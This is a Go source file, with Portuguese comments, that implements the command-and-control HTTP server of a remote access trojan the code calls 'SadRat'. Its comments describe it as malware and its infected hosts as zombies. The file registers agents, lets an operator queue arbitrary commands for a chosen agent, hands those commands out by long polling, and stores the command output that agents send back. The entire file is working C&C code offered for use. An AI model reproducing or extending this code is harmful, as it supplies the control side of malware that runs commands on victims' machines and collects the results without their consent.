package presentation

import (
	"encoding/json"
	"net/http"
	"time"
	"fmt"

	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/google/uuid"
)

// DTOs (Data Transfer Objects) - O formato exato que trafega na rede
type CreateJobRequest struct {
	AgentID string   `json:"agent_id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

// NOVO DTO: O que o Agente envia após executar o comando
type UpdateJobResultRequest struct {
	JobID  string `json:"job_id"`
	Output string `json:"output"`
}

// Repository exige os métodos que o Servidor precisa para funcionar
type Repository interface {
	SaveAgent(agent domain.AgentRow) error
	SaveJob(job domain.JobRow) error // Adicionamos a exigência de salvar o comando
	GetJobForAgent(agentID string) (domain.JobRow, error) // Novo método
	GetJob(id string) (domain.JobRow, error) 
	UpdateJob(job domain.JobRow) error
}

// ServerHTTP é a nossa API C&C
type ServerHTTP struct {
	repo Repository
}

// NewServerHTTP constrói a API injetando o banco de dados
func NewServerHTTP(repo Repository) *ServerHTTP {
	return &ServerHTTP{repo: repo}
}

// Router configura todas as rotas do malware
func (s *ServerHTTP) Router() http.Handler {
	mux := http.NewServeMux()

	// Roteamento REST nativo do Go
	mux.HandleFunc("POST /api/agents", s.handleGiveAnUUIDForAgentRequest)
	mux.HandleFunc("POST /api/jobs", s.handleReceiveCommand) // Nova rota do Operador
	mux.HandleFunc("GET /api/agents/{agent_id}/job", s.handleFetchJobForAgent) // Nova rota para buscar comandos
	mux.HandleFunc("POST /api/jobs/result", s.handleReceiveJobResult)
	return mux
}

// handleGiveAnUUIDForAgentRequest registra um novo zumbi
func (s *ServerHTTP) handleGiveAnUUIDForAgentRequest(w http.ResponseWriter, r *http.Request) {
	newUUID := uuid.NewString()
	agentRow := domain.NewAgentRow(newUUID)

	if err := s.repo.SaveAgent(agentRow); err != nil {
		http.Error(w, "Erro ao registrar agente", http.StatusInternalServerError)
		return
	}

	response := map[string]string{"uuid": newUUID}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(response)
}

// handleReceiveCommand recebe o comando do Operador e agenda para o Agente
func (s *ServerHTTP) handleReceiveCommand(w http.ResponseWriter, r *http.Request) {
	// 1. Decodificação do DTO (Decoding requests)
	var req CreateJobRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	// 2. Transformação do DTO na Entidade/Linha de Banco de Dados
	jobRow := domain.NewJobRow(req.AgentID, req.Command, req.Args)

	// 3. Chamada ao Cofre (Service/Repository Layer)
	if err := s.repo.SaveJob(jobRow); err != nil {
		http.Error(w, "Erro ao salvar comando", http.StatusInternalServerError)
		return
	}

	// 4. Codificação da Resposta (Encoding responses) com o ID gerado
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":       jobRow.ID,
		"agent_id": jobRow.AgentID,
		"command":  jobRow.Command,
		"args":     jobRow.Args,
	})
}

// handleSendJobs é onde a mágica do Long Polling acontece
func (s *ServerHTTP) handleFetchJobForAgent(w http.ResponseWriter, r *http.Request) {
	// Extração nativa da variável da URL
	agentID := r.PathValue("agent_id")

	fmt.Printf("[DEBUG API] Rota acionada! AgentID extraído da URL: '%s'\n", agentID)

	// Long Polling: O C&C "prende" o Agente por até 5 segundos procurando comandos
	for i := 0; i < 5; i++ {
		jobRow, err := s.repo.GetJobForAgent(agentID)
		
		if err == nil {
			// Sucesso! Achamos um comando. Despachamos imediatamente pro Agente.
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"id":       jobRow.ID,
				"command":  jobRow.Command,
				"args":     jobRow.Args,
			})
			return
		}

		// Se não achou, o C&C dorme 1 segundo e tenta de novo (sem gastar CPU)
		time.Sleep(1 * time.Second)
	}

	// Se passar os 5 segundos e não tiver comando, liberamos a conexão do Agente pacificamente
	w.WriteHeader(http.StatusNoContent) // HTTP 204: Indica sucesso, mas sem dados
}

func (s *ServerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Request) {
	// 1. Decodificação do DTO
	var req UpdateJobResultRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	// 2. Busca a Entidade original no banco
	jobRow, err := s.repo.GetJob(req.JobID)
	if err != nil {
		http.Error(w, "Comando não encontrado", http.StatusNotFound)
		return
	}

	// 3. Aplica a Regra de Negócio: Preenche a data de execução e a saída do terminal
	now := time.Now()
	jobRow.ExecutedAt = &now       // Preenche com a data atual
	jobRow.Output = &req.Output    // Preenche com o que veio do JSON

	// 4. Salva a Entidade atualizada no banco
	if err := s.repo.UpdateJob(jobRow); err != nil {
		http.Error(w, "Erro ao atualizar resultado", http.StatusInternalServerError)
		return
	}

	// 5. Retorna sucesso (HTTP 200 OK)
	w.WriteHeader(http.StatusOK)
}